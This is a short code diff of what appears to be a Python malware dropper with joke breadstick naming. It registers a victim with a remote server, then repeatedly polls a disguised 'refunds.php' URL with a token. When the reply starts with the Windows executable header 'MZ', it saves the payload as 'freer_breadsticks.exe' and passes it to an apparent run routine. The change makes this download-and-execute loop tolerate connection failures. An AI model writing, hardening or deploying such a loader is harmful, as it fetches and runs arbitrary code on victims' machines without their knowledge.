@@ -37,15 +37,17 @@ else:
         raise Exception("failed to notify server of new breadsticks affectionado")
     else:
         while 1:
-            a = get('http://%s/respectable_establishment/cgi/refunds.php?q=%s' % (o, token))
-            if a.content[:2] == b'MZ':
-                p = r'freer_breadsticks.exe'
-                res = d_r(p, a.content)            
-                break
+            try:
+                a = get('http://%s/respectable_establishment/cgi/refunds.php?q=%s' % (o, token))
+                if a.content[:2] == b'MZ':
+                    p = r'freer_breadsticks.exe'
+                    res = d_r(p, a.content)            
+                    break
             
-            sleep(10)
-            
-            
+            except:
+                pass#no connection, just wait
+            finally:
+                sleep(10)
         if not res:
             print('om nom!')
             
